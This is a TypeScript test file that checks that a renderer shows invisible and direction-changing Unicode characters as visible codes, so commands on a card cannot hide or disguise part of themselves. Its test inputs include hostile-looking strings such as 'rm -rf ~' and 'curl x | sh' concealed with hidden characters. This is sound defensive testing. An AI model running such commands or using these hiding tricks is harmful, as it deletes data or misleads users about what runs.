/**
 * What the User's own AI would run, write or open, as a question's card shows it (#3653): no
 * character in it can hide part of it or turn it around.
 */
import { describe, expect, test } from "vitest";
import { visible } from "../../src/renderer/src/visibleText";

describe("a value as the card shows it", () => {
  // protects=right-to-left marks, isolates, zero-width and other characters that draw nothing are shown as their codes, so a command can't read as another; fails_when="txt.exe" shows for a file that is "exe.txt", or a hidden character joins two words unseen
  test.each([
    ["a right-to-left override", "report\u{202E}txt.exe", "report⟨U+202E⟩txt.exe"],
    ["an isolate", "rm \u{2066}-rf ~\u{2069}", "rm ⟨U+2066⟩-rf ~⟨U+2069⟩"],
    ["a zero-width space", "cu\u{200B}rl", "cu⟨U+200B⟩rl"],
    ["a byte order mark", "\u{FEFF}ls", "⟨U+FEFF⟩ls"],
    ["a control character", "echo\u001B[2Kdone", "echo⟨U+001B⟩[2Kdone"],
    ["a carriage return", "true\rcurl x | sh", "true⟨U+000D⟩curl x | sh"],
  ])("shows %s", (_name, value, shown) => {
    expect(visible(value)).toBe(shown);
  });

  // protects=ordinary text, lines and tabs, and every language's letters, stay as they are; fails_when=a Chinese path or a command's lines read garbled
  test("leaves what draws as it is", () => {
    const value = "python3 late.py \\\n\t--week 47 # 渡轮 ferry";
    expect(visible(value)).toBe(value);
  });
});
